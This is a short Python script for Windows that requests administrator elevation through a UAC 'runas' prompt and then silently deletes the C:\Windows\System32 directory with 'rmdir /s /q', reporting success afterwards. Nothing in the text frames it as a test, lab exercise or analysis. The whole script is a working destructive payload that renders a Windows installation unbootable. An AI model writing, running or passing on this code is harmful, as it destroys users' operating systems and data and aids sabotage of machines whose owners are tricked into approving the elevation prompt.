import os
import subprocess
import sys
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()
dir_path = r"C:\Windows\System32" 

if os.path.exists(dir_path) and os.path.isdir(dir_path):
    subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", dir_path], check=True)
    print("Directory removed successfully.")
else:
    print(f"Directory does not exist: {dir_path}")
